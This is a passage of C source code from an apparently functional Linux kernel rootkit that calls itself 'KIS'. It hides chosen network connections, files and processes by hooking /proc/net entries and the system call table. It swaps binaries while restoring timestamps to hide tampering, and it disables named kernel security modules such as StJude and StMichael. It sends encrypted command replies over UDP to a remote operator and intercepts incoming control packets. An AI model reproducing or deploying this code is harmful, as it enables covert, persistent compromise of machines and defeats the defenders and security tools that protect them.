	for(curr=redirs;curr!=NULL;curr=curr->next)
	{
		if(strcmp(curr->old, old) == 0)
		{
			read_unlock(&redirsl);
			return curr;
		}
	}
	read_unlock(&redirsl);
	return NULL;
}

struct nhide {
	long ip;
	short port;
	struct nhide *next;
};

rwlock_t nhidesl;
struct nhide *nhides = NULL, *nhidest = NULL;

int i_hide_conns(char *buffer, int ret)
{
	char *curr, *back, *end;
	long sip, dip;
	short sport, dport;
	int hide = 0;
	struct nhide *ncurr;

	back = (char *) kmalloc(ret + 1, GFP_KERNEL);
	memcpy(back, buffer, ret);
	back[ret] = 0;
	memset(buffer, 0, ret);
	curr = strtok(back, "\n");
	sprintf(buffer, "%s", curr);
	end = buffer + strlen(buffer);
	for(curr=strtok(NULL, "\n");curr!=NULL;curr=strtok(NULL, "\n"))
	{
		sip = i_strtol(curr + 6, 8, 16);
		sport = htons((short) i_strtol(curr + 15, 4, 16));
		dip = i_strtol(curr + 20, 8, 16);
		dport = htons((short) i_strtol(curr + 29, 4, 16));
		read_lock(&nhidesl);
        	for(ncurr=nhides;ncurr!=NULL;ncurr=ncurr->next)
        	{
			hide=0;
			if(ncurr->ip == sip || ncurr->ip == 0)
				if(ncurr->port == sport || ncurr->port == 0)
					hide++;
			if(ncurr->ip == dip || ncurr->ip == 0)
				if(ncurr->port == dport || ncurr->port == 0)
					hide++;
			if(ncurr->ip == dip || ncurr->ip == 0)
				if(ncurr->port == sport || ncurr->port == 0)
					hide++;
			if(hide > 0)
				goto hido;
        	}
		read_unlock(&nhidesl);
		sprintf(buffer + strlen(buffer), "\n%s", curr);
hido:
		if(hide > 0)
			ret-=(strlen(curr) + 1);
	}
	kfree(back);
	return ret;
}

int r_hide_net(char *args, struct resp *res)
{
	int i;
	long ip;
	short port;
	char *ptr, *tok, *back;
	ptr = (char *) &ip;
	back = (char *) kmalloc(strlen(args) + 1, GFP_KERNEL);
	memcpy(back, args, strlen(args));
	back[strlen(args)] = 0;
	tok = strtok(back, ":");
	memset(ptr, 0, 4);
	for(tok = strtok(tok, "."),i=0;tok!=NULL && i < sizeof(ip);
		tok = strtok(NULL, "."),i++)
		ptr[i] = i_strtol(tok, strlen(tok), 10);

	if(i < 4 && ptr[0] != 0)
		return 0;

	memcpy(back, args, strlen(args));
	strtok(back, ":");
	tok = strtok(NULL, ":");
	if(tok == NULL)
		return 0;
	port = htons(i_strtol(tok, strlen(tok), 10));
	kfree(back);
	switch(i_hide_net(ip, port))
	{
		case 0:
			i_reply(res, "0%s connections hidden\r\n", args);
			break;
		default:
			i_reply(res, "0%s is already hidden\r\n", args);
			break;
	}
	return 0;
}

int i_hide_net(long ip, short port)
{
	struct nhide *tmp;
	if(i_nishidden(ip, port))
		return -1;

	tmp = (struct nhide *) kmalloc(sizeof(struct nhide), GFP_KERNEL);
	tmp->ip = ip;
	tmp->port = port;
	tmp->next = NULL;

	write_lock(&nhidesl);	
	if(nhides == NULL)
	{
		nhides = tmp;
		nhidest = nhides;
	}
	else
	{
		nhidest->next = tmp;
		nhidest = nhidest->next;
	}
	write_unlock(&nhidesl);
	return 0;
}

int r_unhide_net(char *args, struct resp *res)
{
        int i;
        long ip;
        short port;
        char *ptr, *tok, *back;
        ptr = (char *) &ip;
        back = (char *) kmalloc(strlen(args) + 1, GFP_KERNEL);
        memcpy(back, args, strlen(args));
        back[strlen(args)] = 0;
        tok = strtok(back, ":");
        memset(ptr, 0, 4);
        for(tok = strtok(tok, "."),i=0;tok!=NULL && i < sizeof(ip);
                tok = strtok(NULL, "."),i++)
                ptr[i] = i_strtol(tok, strlen(tok), 10);

        if(i < 4 && ptr[0] != 0)
                return 0;

        memcpy(back, args, strlen(args));
        strtok(back, ":");
        tok = strtok(NULL, ":");
        if(tok == NULL)
                return 0;
        port = htons(i_strtol(tok, strlen(tok), 10));
        kfree(back);

        switch(i_unhide_net(ip, port))
	{
		case 0:
			i_reply(res, "0%s connections unhidden\r\n", args);
			break;
		default:
			i_reply(res, "0%s not hidden\r\n", args);
			break;
	}
        return 0;
}

int i_unhide_net(long ip, short port)
{
	struct nhide *curr, *prev;
	write_lock(&nhidesl);
	for(curr=nhides, prev=NULL;curr!=NULL;prev=curr,curr=curr->next)
	{
		if(curr->ip == ip)
			if(curr->port == port)
			{
				if(curr==nhidest)
					nhidest = prev;
				if(curr==nhides)
					nhides=nhides->next;
				else
					prev->next = curr->next;
				kfree(curr);
				write_unlock(&nhidesl);
				return 0;
			}
	}

	if(ip == 0 && port == 0)
	{
		for(curr=nhides;curr!=NULL;)
		{
			prev = curr;
			curr = curr->next;
			kfree(prev);
		}
		nhides = NULL;
		nhidest = NULL;
		write_unlock(&nhidesl);
		return 0;
	}
	write_unlock(&nhidesl);
	return -1;
}

int r_list_nhides(char *args, struct resp *res)
{
	struct nhide *curr;
	i_reply(res, "0--list nhides--\r\n");
	read_lock(&nhidesl);
	for(curr=nhides;curr!=NULL;curr=curr->next)
		i_reply(res, "0%u.%u.%u.%u:%d\r\n", NIPQUAD(curr->ip),
			ntohs(curr->port));
	read_unlock(&nhidesl);
	i_reply(res, "0--end nhides--\r\n");
	return 0;
}

int i_nishidden(long ip, short port)
{
	struct nhide *curr;
	read_lock(&nhidesl);
	for(curr=nhides;curr!=NULL;curr=curr->next)
	{
		if(curr->port == 0 || curr->port == port)
			if(curr->ip == 0 || curr->ip == ip)
			{
				read_unlock(&nhidesl);
				return 1;
			}
	}
	read_unlock(&nhidesl);
	return 0;
}

int i_proc_hook(char *name, void *new, void *old)
{
        struct proc_dir_entry *h;
        struct file *file;
        file = filp_open(name, O_RDONLY, 0);
        if(IS_ERR(file))
                return -1;

        h = (struct proc_dir_entry *) file->f_dentry->d_inode->u.generic_ip;
        if(old == (void *) 1)
                memcpy(&h->get_info, new, 4);
        else
        {
                memcpy(old, &h->get_info, 4);
                memcpy(&h->get_info, &new, 4);
        }
	filp_close(file, NULL);
        return 0;
}

#ifndef ELITE_GID
struct fhide {
	long ino;
	char *name;
	struct fhide *next;
};

#define MAX_FHIDES 32
rwlock_t fhidesl;
int nfhides = 0;
struct fhide *fhides=NULL, *fhidest=NULL;
#endif

int r_list_fhides(char *args, struct resp *res)
{
#ifdef ELITE_GID
	i_reply(res, "0cannot list fhides if ELITE_GID is defined\r\n");
#else
	struct fhide *curr;
	i_reply(res, "0--list fhides--\r\n");
	read_lock(&fhidesl);
	for(curr=fhides;curr!=NULL;curr=curr->next)
		i_reply(res, "0%s\r\n", curr->name);
	read_unlock(&fhidesl);
	i_reply(res, "0--end fhides--\r\n");
#endif
	return 0;
}

int r_hide_file(char *args, struct resp *res)
{
	struct file *filp;
	struct dentry *d;
	filp = (struct file *) filp_open(args, O_RDONLY, 0);
        if(IS_ERR(filp))
        {
		i_reply(res, "0%s: file not found\r\n", args);
		return 0;
	}        
	d = filp->f_dentry;
#ifdef ELITE_GID
	d->d_inode->i_gid = ELITE_GID;
#else
	if(i_hide_file((char *) d->d_name.name, d->d_inode->i_ino, res)  < 0)
	{
		filp_close(filp, NULL);
		return 0;
	}
#endif
	filp_close(filp, NULL);
        i_reply(res, "0%s hidden\r\n", args);
	return 0;
}

#ifndef ELITE_GID
int i_hide_file(char *name, long ino, struct resp *res)
{
	struct fhide *tmp;
	if(i_fishidden(name, ino))
	{
		i_reply(res, "0%s is already hidden\r\n", name);
		return -1;
	}
	write_lock(&fhidesl);
	if(nfhides > MAX_FHIDES)
	{
		write_unlock(&fhidesl);
		i_reply(res, "0file hide cap reached: %d\r\n", MAX_FHIDES);
		return -1;
	}
	tmp = (struct fhide *) kmalloc(sizeof(struct fhide), GFP_KERNEL);
	tmp->name = (char *) kmalloc(strlen(name) + 1, GFP_KERNEL);
	strncpy(tmp->name, name, strlen(name));
	tmp->name[strlen(name)] = 0;
	tmp->ino = ino;
	tmp->next = NULL;

	if(fhides == NULL)
	{
		fhides = tmp;
		fhidest = fhides;
	}
	else
	{
		fhidest->next = tmp;
		fhidest = fhidest->next;
	}
	nfhides++;
	write_unlock(&fhidesl);
	i_write_ht();
	return 0;
}
#endif

int r_unhide_file(char *args, struct resp *res)
{
#ifndef ELITE_GID
	struct fhide *curr, *prev;
#endif
	struct file *filp;
	filp = (struct file *) filp_open(args, O_RDONLY, 0);
	if(IS_ERR(filp))
		return -1;
#ifdef ELITE_GID
	filp->f_dentry->d_inode->i_gid = 0;
	filp_close(filp, NULL);
	i_reply(res, "0%s unhidden\r\n", args);
#else
	if(i_fishidden((char *) filp->f_dentry->d_name.name, 
		filp->f_dentry->d_inode->i_ino) == 0)
	{
			i_reply(res, "0%s isn't hidden\r\n", args);
			filp_close(filp, NULL);
			return 0;
	}

	write_lock(&fhidesl);
	for(curr=fhides,prev=NULL;curr!=NULL;prev=curr,curr=curr->next)
	{
		if(curr->ino == filp->f_dentry->d_inode->i_ino)
		{
			if(strcmp(curr->name, filp->f_dentry->d_name.name)==0)
			{
				if(curr==fhidest)
					fhidest = prev;
				if(curr==fhides)
					fhides = NULL;
				else
					prev->next = curr->next;
				i_reply(res, "0%s unhidden\r\n", args);
				nfhides--;
				kfree(curr->name);
				kfree(curr); 
				break;
			}
		}
	}
	write_unlock(&fhidesl);
	filp_close(filp, NULL);
	i_write_ht();
#endif
	return 0;
}

#ifndef ELITE_GID
void i_write_ht(void)
{
	struct fhide *curr;
	struct file *filp;
	mm_segment_t oldfs;
	char *tmp;

	oldfs=get_fs();
	set_fs(KERNEL_DS);
	o_unlink(hidetab);
	filp = filp_open(hidetab, O_CREAT | O_WRONLY, 0);
	if(IS_ERR(filp))
	{
		set_fs(oldfs);
		return;
	}
	write_lock(&fhidesl);
	for(curr=fhides;curr!=NULL;curr=curr->next)
	{
		tmp = (char *) kmalloc(strlen(curr->name) + 11, GFP_KERNEL);
		memset(tmp, 0, strlen(curr->name) + 11);
		sprintf(tmp, "%s:%x\n", curr->name, curr->ino);
		filp->f_op->write(filp, tmp, strlen(tmp), &filp->f_pos);
		kfree(tmp);
	}
	write_unlock(&fhidesl);
	set_fs(oldfs);
	filp_close(filp, NULL);
	return;
}
#endif

#ifdef ELITE_GID
int i_fishidden(struct super_block *sb, long ino)
{
	int ret = 0;
	struct inode *inode;
	if((inode = iget(sb, ino)) == NULL)
		return 0;
	if(inode->i_gid == ELITE_GID)
		ret = 1;
	iput(inode);
	return ret;
}

#else
int i_fishidden(char *name, long ino)
{
	struct fhide *curr;
	read_lock(&fhidesl);
	for(curr=fhides;curr!=NULL;curr=curr->next)
		if(curr->ino == ino)
			if(strcmp(curr->name, name) == 0)
			{
				read_unlock(&fhidesl);
				return 1;
			}
	read_unlock(&fhidesl);
	return 0;
}
#endif

struct phide {
	pid_t pid;
	struct phide *next;
};

rwlock_t phidesl;
struct phide *phides=NULL,*phidest=NULL;

int r_hide_proc(char *args, struct resp *res)
{
	pid_t pid = i_strtol(args, strlen(args), 10);
	if(pid < 1)
	{
		i_reply(res, "0invalid pid\r\n");
		return 0;
	}
	switch(i_hide_proc(pid))
	{
		case -1:
				i_reply(res, "0pid %d already hidden\r\n", pid);
				break;
		case 0:
				i_reply(res, "0pid %d hidden\r\n", pid);
				break;
		default:
				break;
	}
	return 0;
}

int i_hide_proc(pid_t pid)
{
	struct phide *tmp;
	if(i_pishidden(pid))
		return -1;
	tmp = (struct phide *) kmalloc(sizeof(struct phide), GFP_KERNEL);
	tmp->pid = pid;
	tmp->next = NULL;
	write_lock(&phidesl);
	if(phides == NULL)
	{
		phides = tmp;
		phidest = tmp;
	}
	else
	{
		phidest->next = tmp;
		phidest=tmp;
	}
	write_unlock(&phidesl);
	return 0;
}

int r_unhide_proc(char *args, struct resp *res)
{
	pid_t pid = i_strtol(args, strlen(args), 10);
	switch(i_unhide_proc(pid))
	{
		case 0:
			i_reply(res, "0pid %d unhidden\r\n", pid);
			break;
		default:
			i_reply(res, "0pid %d not hidden\r\n", pid);
			break;
	}
	return 0;
}

int i_unhide_proc(pid_t pid)
{
	struct phide *curr, *prev;
	int ret = -1, dead;

	if(pid == 0)
	{
		write_lock(&phidesl);
		for(curr=phides;curr!=NULL;)
		{
			prev = curr;
			curr=curr->next;
			kfree(prev);
		}
		phides = NULL;
		phidest = NULL;
		write_unlock(&phidesl);
		return 0;
	}
	
	write_lock(&phidesl);
        for(curr=phides,prev=NULL;curr != NULL;prev=curr,curr=curr->next)
	{
back:
		dead = i_isdead(curr->pid);
                if(curr->pid == pid)
                {
			ret = 0;
			dead++;
		}
		
		if(dead)
		{
			if(prev == NULL)
				phides=curr->next;
			else
                        	prev->next=curr->next;

			if(curr==phidest)
				phidest=prev;
			if(curr->next == NULL)
			{
				kfree(curr);
				break;
			}
			kfree(curr);
			curr=prev->next;
			goto back;
                }
	}
	write_unlock(&phidesl);
	return ret;
}

int i_isdead(pid_t pid)
{
	int dead = 1;
	struct task_struct *task;
	for(task = init_task.next_task; task->pid != 0; task=task->next_task)
		if(task->pid == pid)
			dead = 0;
	return dead;
}

int r_list_phides(char *args, struct resp *res)
{
	struct phide *curr;
	i_reply(res, "0--list phides--\r\n");
	read_lock(&phidesl);
	for(curr=phides;curr!=NULL;curr=curr->next)
                i_reply(res, "0%d\r\n", curr->pid);
	read_unlock(&phidesl);
	i_reply(res, "0--end phides--\r\n");
	return 0;
}

int i_pishidden(pid_t pid)
{
	struct phide *curr;
	read_lock(&phidesl);
	for(curr=phides;curr!=NULL;curr=curr->next)
		if(curr->pid == pid)
		{
			read_unlock(&phidesl);
			return 1;
		}
	read_unlock(&phidesl);
	return 0;
}

int r_remove(char *args, struct resp *res)
{
	if(strcmp(args, "yes") == 0)
	{
		mm_segment_t oldfs;
		long ctime, mtime, atime;
#if LINUX_VERSION_CODE >= KERNEL_VERSION(2,3,0)
		struct nameidata nd;

		oldfs=get_fs();
		set_fs(KERNEL_DS);
		if(user_path_walk(back_bin, &nd))
		{
			set_fs(oldfs);
			i_reply(res, "0cannot stat %s, remove failed\r\n", 
				back_bin);
			return 0;
		}
		ctime = nd.dentry->d_inode->i_ctime;
		mtime = nd.dentry->d_inode->i_mtime;
		atime = nd.dentry->d_inode->i_atime;
		path_release(&nd);

		if(o_rename(back_bin, trojan_bin) < 0)
		{
			set_fs(oldfs);
			i_reply(res, "0rename of %s to %s failed\r\n", back_bin,
				trojan_bin);
			return 0;
		}

		if(user_path_walk(trojan_bin, &nd))
		{
			set_fs(oldfs);
			i_reply(res, "0cannot stat %s, remove failed\r\n", 
				trojan_bin);
			return 0;
		}

		nd.dentry->d_inode->i_ctime = ctime;
		nd.dentry->d_inode->i_mtime = mtime;
		nd.dentry->d_inode->i_atime = atime;
		path_release(&nd);
#else
		struct dentry *dentry;
		oldfs = get_fs();
		set_fs(KERNEL_DS);
		dentry = lookup_dentry(back_bin, NULL, 0);
		if(IS_ERR(dentry))
		{
			set_fs(oldfs);
			i_reply(res, "0cannot stat %s, remove failed\r\n", 
				back_bin);
			return 0;
		}

		ctime = dentry->d_inode->i_ctime;
		mtime = dentry->d_inode->i_mtime;
		atime = dentry->d_inode->i_atime;
		dput(dentry);

		if(o_rename(back_bin, trojan_bin) < 0)
		{
			set_fs(oldfs);
			i_reply(res, "0rename of %s to %s failed\r\n", back_bin,
				trojan_bin);
			return 0;
		}
		dentry = lookup_dentry(trojan_bin, NULL, 0);
		if(IS_ERR(dentry))
		{
			set_fs(oldfs);
			i_reply(res, "0cannot stat %s, remove failed\r\n", 
				trojan_bin);
			return 0;
		}

		dentry->d_inode->i_ctime = ctime;
		dentry->d_inode->i_mtime = mtime;
		dentry->d_inode->i_atime = atime;
		dput(dentry);
#endif
		set_fs(oldfs);
		restart = 0;
		i_reply(res, "0removed server\r\n");
		return 0;
	}

	i_reply(res, "0argument must be \"yes\" to remove\r\n");
	return 0;
}
/*
void i_remove_server(struct resp *res)
{
	mm_segment_t oldfs;
	long ctime, mtime, atime;
#if LINUX_VERSION_CODE >= KERNEL_VERSION(2,3,0)
	struct nameidata nd;

	oldfs=get_fs();
	set_fs(KERNEL_DS);
	if(user_path_walk(back_bin, &nd))
	{
		set_fs(oldfs);
		i_reply(res, "0cannot stat %s, remove failed\r\n", back_bin);
		return;
	}
	ctime = nd.dentry->d_inode->i_ctime;
	mtime = nd.dentry->d_inode->i_mtime;
	atime = nd.dentry->d_inode->i_atime;
	path_release(&nd);
	if(o_rename(back_bin, trojan_bin) < 0)
	{
		set_fs(oldfs);
		i_reply(res, "0rename of %s to %s failed\r\n", back_bin,
			trojan_bin);
		return;
	}
	
	if(user_path_walk(trojan_bin, &nd))
	{
		set_fs(oldfs);
		i_reply(res, "0cannot stat %s, remove failed\r\n", trojan_bin);
		return;
	}
	nd.dentry->d_inode->i_ctime = ctime;
	nd.dentry->d_inode->i_mtime = mtime;
	nd.dentry->d_inode->i_atime = atime;
	path_release(&nd);
#else
	struct dentry *dentry;
	oldfs = get_fs();
	set_fs(KERNEL_DS);
        dentry = lookup_dentry(back_bin, NULL, 0);
        if(IS_ERR(dentry))
	{
		set_fs(oldfs);
		i_reply(res, "0cannot stat %s, remove failed\r\n", back_bin);
		return;
	}
        ctime = dentry->d_inode->i_ctime;
        mtime = dentry->d_inode->i_mtime;
        atime = dentry->d_inode->i_atime;
        dput(dentry);
        if(o_rename(back_bin, trojan_bin) < 0)
	{
		set_fs(oldfs);
		i_reply(res, "0rename of %s to %s failed\r\n", back_bin,
			trojan_bin); 
		return;
	}
	dentry = lookup_dentry(trojan_bin, NULL, 0);
	if(IS_ERR(dentry))
	{
		set_fs(oldfs);
		i_reply(res, "0cannot stat %s, remove failed\r\n", trojan_bin);
		return;
	}

	dentry->d_inode->i_ctime = ctime;
	dentry->d_inode->i_mtime = mtime;
	dentry->d_inode->i_atime = atime;
	dput(dentry);
#endif
	set_fs(oldfs);
	restart = 0;
	i_reply(res, "0removed server\r\n");
	return;
}
*/
int r_shutdown(char *args, struct resp *res)
{
	if(running == 0)
		return 0;
	if(strcmp(args, "yes") != 0)
	{
		i_reply(res, "0argument must be yes to shutdown\r\n");
		return 0;
	}
	i_reply(res, "0KIS shutdown\r\n");
        lock_kernel();
	running = 0;
	__this_module.cleanup = (void *) &i_cleanup;
        dev_add_pack(o_ip_packet_type);
        dev_remove_pack(&h_ip_packet_type);
        i_proc_hook("/proc/net/tcp", &o_tcp_get_info, (char *) 1);
        i_proc_hook("/proc/net/udp", &o_udp_get_info, (char *) 1);
        i_proc_hook("/proc/net/raw", &o_raw_get_info, (char *) 1);

#define RESTORE(x) sys_call_table[__NR_##x] = o_##x
        RESTORE(execve);
        RESTORE(mkdir);
        RESTORE(chdir);
        RESTORE(getdents);
        RESTORE(clone);
        RESTORE(fork);
        RESTORE(exit);
        RESTORE(rmdir);
        RESTORE(open);
        RESTORE(unlink);
        RESTORE(rename);
        RESTORE(stat);
        RESTORE(lstat);
#ifdef __NR_stat64
        RESTORE(stat64);
#endif
#ifdef __NR_lstat64
        RESTORE(lstat64);
#endif
        RESTORE(socketcall);
        RESTORE(init_module);

        i_unhide_proc(0);
        i_unhide_net(0, 0);
        queue_quit = 0;
        unlock_kernel();
	return 0;
}

int i_addfunct(char *plug, char *name, int (*funct)(char *, struct resp *))
{
	struct funct *prev, *curr, *tmp;
	tmp = (struct funct *) kmalloc(sizeof(struct funct), GFP_KERNEL);
	tmp->plug = plug;
	tmp->name = name;
	tmp->funct = funct;
	tmp->next = NULL;
	if(functs == NULL)
	{
		functs = tmp;
		return 0;
	}
	for(curr=functs,prev=NULL;curr != NULL;prev=curr,curr=curr->next)
		if(strcmp(curr->name, tmp->name) == 0)
		{
			kfree(tmp);
			return -1;
		}
	prev->next = tmp;
	return 0;
}

int i_exec_funct(char *res, char **args)
{
	struct funct *curr;
	struct resp *resp;
	int i;

	if(functs == NULL)
		return -1;

	switch(res[0])
	{
		case '0':
			resp = NULL;
			break;
		case '1':
			resp = (struct resp *) kmalloc(sizeof(struct resp), 
						GFP_KERNEL);
			memset(resp, 0, sizeof(struct resp));
			break;
		default:
			return -1;
	}

	for(curr=functs;curr!=NULL;curr=curr->next)
	{
		if(strcmp(args[0], curr->name) == 0)
		{
			if(curr->funct == NULL)
			{
				struct execve_args tmp;
				pid_t pid;
				tmp.path = curr->plug;
				tmp.argv = args;
				pid = kernel_thread(i_exec_prog, &tmp, 0);
				if(pid < 0)
					i_reply(resp,"0error in exec %s\r\n",
						args[0]);
				else
				{
					sigset_t tmpsig;
					i_hide_proc(pid);
					WAITPID(pid);
				}
				
			}
			else
				curr->funct(args[1], resp);
			i=0;
			goto out;
		}
	}
	i=-1;
out:
	if(resp != NULL)
		kfree(resp);
	return i;
}

#ifdef ANTI_SEC
void i_remove_protect(struct module *mod, int rem)
{
	int unload;

	for(;mod != NULL;mod=mod->next)
	{
		unload = 0;

		if(strcmp(mod->name, "StJude") == 0)
			unload++;

		if(strcmp(mod->name, "StMichael") == 0)
			unload++;

		if(strcmp(mod->name, "lomac_mod") == 0)
			unload++;
		
		if(strcmp(mod->name, "carbonite") == 0)
			unload++;

		if(unload)
		{
			if(rem)
			{
				if(mod->init != &i_cleanup && 
					mod->cleanup != NULL)
				{
					struct tty_struct *bak;
					long flags, size, nsyms, ndeps;
					flags = mod->flags;
					size = mod->size;
					nsyms = mod->nsyms;
					ndeps = mod->ndeps;
					bak = current->tty;
					current->tty = NULL;
					mod->cleanup();
					mod->cleanup = (void *) &i_cleanup;
					current->tty = bak;
					mod->flags = flags;
					mod->size = size;
					mod->nsyms = nsyms;
					mod->ndeps = ndeps;
				}
			}
			else
				mod->init = (void *) &i_cleanup;
		}
	}
	return;
}
#endif

int i_cleanup(void)
{
	return 0;
}

void i_reply(struct resp *to, char *fmt, ...)
{
	va_list args;
	struct socket *sock;
	struct msghdr msg;
	struct iovec iov;
	struct sockaddr_in addr;
	mm_segment_t oldfs;
	char *curr, *tmp, *m;
	long t;
	long size = 0;

	if(to == NULL)
		return;

	va_start(args, fmt);
	for(curr=fmt;*curr != 0;curr++)
	{
		if(*curr != '%')
		{
			size++;
			continue;
		}
		curr++;
		switch(*curr)
		{
			case 's':
				size+=strlen((char *) va_arg(args, char *));
				break;
			case 'u':
			case 'd':
				t = (long) va_arg(args, long);
				while(t > 9)
				{
					size++;
					t/=10;
				}
				size++;
				break;
			case 'x':
				size+=8;
				break;
			default:
				if(*curr!=0)
					curr++;
				break;
		}
	}
	va_end(args);

	size++;
	m = (char *) kmalloc(size, GFP_KERNEL);
	memset(m, 0, size);
	tmp = m;

	va_start(args, fmt);
	for(curr=fmt;*curr != 0;curr++)
	{
		if(*curr != '%')
		{
			*(tmp++) = *curr;
			continue;
		}

		curr++;
		switch(*curr)
		{
			case 's':
				sprintf(tmp, "%s", (char *) va_arg(args,
					char *));
				break;
			case 'u':
				sprintf(tmp, "%u", (unsigned char) va_arg(args,
					int));
				break;
			case 'd':
				sprintf(tmp, "%d", (long) va_arg(args, long));
				break;
			case 'x':
				sprintf(tmp, "%x", (long) va_arg(args, long));
				break;
			default:
				if(*curr != 0)
					curr++;
				break;
		}
		tmp+=strlen(tmp);
	}
	va_end(args);

	if(to->sip == 0)
	{
		if(current->tty == NULL)
			return;
		(*(current->tty->driver).write)(current->tty,
			0, m+1, strlen(m) - 1);
		return;
	}

	if(sock_create(AF_INET, SOCK_DGRAM, IPPROTO_UDP, &sock) < 0)
		return;

	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = to->dport;
	addr.sin_addr.s_addr = to->dip;

	msg.msg_name = (void *) &addr;
	msg.msg_namelen = sizeof(addr);
	msg.msg_iov = &iov;
	msg.msg_iovlen = 1;
	msg.msg_control = NULL;
	msg.msg_controllen = 0;
	msg.msg_flags = 0;
	msg.msg_iov->iov_len = (__kernel_size_t) strlen(m);
	msg.msg_iov->iov_base = m;

	oldfs = get_fs(); set_fs(KERNEL_DS);
	sock_sendmsg(sock, &msg, (size_t) strlen(m));
	set_fs(oldfs);
	sock_release(sock);
	kfree(m);
	return;
}

long i_strtol(char *in, int len, int base)
{
	long ret = 0;
	int i;
	for(i=0;i<len;i++)
	{
		if(in[i] >= '0' && in[i] <= '9')
			ret=(ret * base) + (in[i] - '0');
		if((in[i] >= 'a' && in[i] <= 'f') && base == 16)
			ret=(ret * base) + (in[i] - 'a' + 10);
		if((in[i] >= 'A' && in[i] <= 'F') && base == 16)
			ret=(ret * base) + (in[i] - 'A' + 10);
	}
	return ret;
}

void i_crypt(unsigned long, unsigned long, unsigned short, unsigned char *, unsigned char *, unsigned long);
void i_sha(char *, unsigned long, unsigned long *);

union longbyte
{
    unsigned long W[80];        /* Process 16 32-bit words at a time */
    char B[320];                /* But read them as bytes for counting */
};

#define f0(x,y,z) (z ^ (x & (y ^ z)))           /* Magic functions */
#define f1(x,y,z) (x ^ y ^ z)
#define f2(x,y,z) ((x & y) | (z & (x | y)))
#define f3(x,y,z) (x ^ y ^ z)

#define K0 0x5a827999                           /* Magic constants */
#define K1 0x6ed9eba1
#define K2 0x8f1bbcdc
#define K3 0xca62c1d6

#define S(n, X) ((X << n) | (X >> (32 - n)))    /* Barrel roll */

#define r0(f, K) \
	temp = S(5, A) + f(B, C, D) + E + *p0++ + K; \
	E = D;  \
	D = C;  \
	C = S(30, B); \
	B = A;  \
	A = temp

#define r1(f, K) \
	temp = S(5, A) + f(B, C, D) + E + \
		(*p0++ = *p1++ ^ *p2++ ^ *p3++ ^ *p4++) + K; \
	E = D;  \
	D = C;  \
	C = S(30, B); \
	B = A;  \
	A = temp

void i_crypt(unsigned long ip1, unsigned long ip2, unsigned short port, unsigned char *src, unsigned char *dst, unsigned long len)
{
	char *in;
	unsigned char *xorkey;
	long i;
	int j;
	in = (char *) kmalloc(sizeof(KEY1) + 20, GFP_KERNEL);
	xorkey = (unsigned char *) kmalloc(40, GFP_KERNEL);
	sprintf(in, "%x%x%4x%s", ip1, ip2, port, KEY1);
	i_sha(in, strlen(in), (unsigned long *) xorkey);
	for(i=0,j=0;i<len;i++,j+=2)
	{
		if(j>18)
			j=0;
		dst[i] = src[i] ^ xorkey[j];
		dst[i] ^= xorkey[j+1];
	}
	kfree(xorkey);
	kfree(in);
}

void i_sha(char *mem, unsigned long length, unsigned long *buf)
{
	int i, nread, nbits;
	union longbyte d;
	unsigned long hi_length, lo_length;
	int padded;
	char *s;

	register unsigned long *p0, *p1, *p2, *p3, *p4;
	unsigned long A, B, C, D, E, temp;

	unsigned long h0, h1, h2, h3, h4;

	h0 = 0x67452301;                            /* Accumulators */
	h1 = 0xefcdab89;
	h2 = 0x98badcfe;
	h3 = 0x10325476;
	h4 = 0xc3d2e1f0;

	padded = 0; 
	s = mem; 
	for (hi_length = lo_length = 0; ;)  /* Process 16 longs at a time */ 
	{ 
		if (length < 64) 
			nread = length;
		else             
			nread = 64;
		length -= nread;
		memcpy(d.B, s, nread);
		s += nread;
		if (nread < 64)   /* Partial block? */
		{
			nbits = nread << 3;               /* Length: bits */
			if ((lo_length += nbits) < nbits)
			hi_length++;              /* 64-bit integer */

			if (nread < 64 && ! padded)  /* Append a single bit */
			{
				d.B[nread++] = 0x80; /* Using up next byte */
				padded = 1;       /* Single bit once */
			}
			for (i = nread; i < 64; i++) /* Pad with nulls */
				d.B[i] = 0;
			if (nread <= 56)   /* Room for length in this block */
			{
				d.W[14] = hi_length;
				d.W[15] = lo_length;
			}
		}
		else    /* Full block -- get efficient */
		{
			if ((lo_length += 512) < 512)
				hi_length++;    /* 64-bit integer */
		}

		p0 = d.W;
		A = h0; B = h1; C = h2; D = h3; E = h4;

		r0(f0,K0); r0(f0,K0); r0(f0,K0); r0(f0,K0); r0(f0,K0);
		r0(f0,K0); r0(f0,K0); r0(f0,K0); r0(f0,K0); r0(f0,K0);
		r0(f0,K0); r0(f0,K0); r0(f0,K0); r0(f0,K0); r0(f0,K0);
		r0(f0,K0);

		p1 = &d.W[13]; p2 = &d.W[8]; p3 = &d.W[2]; p4 = &d.W[0];

		r1(f0,K0); r1(f0,K0); r1(f0,K0); r1(f0,K0);
		r1(f1,K1); r1(f1,K1); r1(f1,K1); r1(f1,K1); r1(f1,K1);
		r1(f1,K1); r1(f1,K1); r1(f1,K1); r1(f1,K1); r1(f1,K1);
		r1(f1,K1); r1(f1,K1); r1(f1,K1); r1(f1,K1); r1(f1,K1);
		r1(f1,K1); r1(f1,K1); r1(f1,K1); r1(f1,K1); r1(f1,K1);
		r1(f2,K2); r1(f2,K2); r1(f2,K2); r1(f2,K2); r1(f2,K2);
		r1(f2,K2); r1(f2,K2); r1(f2,K2); r1(f2,K2); r1(f2,K2);
		r1(f2,K2); r1(f2,K2); r1(f2,K2); r1(f2,K2); r1(f2,K2);
		r1(f2,K2); r1(f2,K2); r1(f2,K2); r1(f2,K2); r1(f2,K2);
		r1(f3,K3); r1(f3,K3); r1(f3,K3); r1(f3,K3); r1(f3,K3);
		r1(f3,K3); r1(f3,K3); r1(f3,K3); r1(f3,K3); r1(f3,K3);
		r1(f3,K3); r1(f3,K3); r1(f3,K3); r1(f3,K3); r1(f3,K3);
		r1(f3,K3); r1(f3,K3); r1(f3,K3); r1(f3,K3); r1(f3,K3);
		h0 += A; h1 += B; h2 += C; h3 += D; h4 += E;

		if (nread <= 56) break; 
	}

	buf[0] = h0; buf[1] = h1; buf[2] = h2; buf[3] = h3; buf[4] = h4;
}

int h_ip_rcv(struct sk_buff *skb, NET_DEVICE *dev,struct packet_type *pt)
{
	char *data;
	char *dec;
	struct iphdr *iph;
	short dport;

	if(skb->pkt_type == PACKET_OTHERHOST)
		goto reg;
	if(skb->len%MOD != REM)
		goto reg;
	data = skb->data + 28;
        dport = *(short *) &skb->data[22];
        iph=skb->nh.iph;

	dec = (char *) kmalloc(skb->len - 28, GFP_KERNEL);
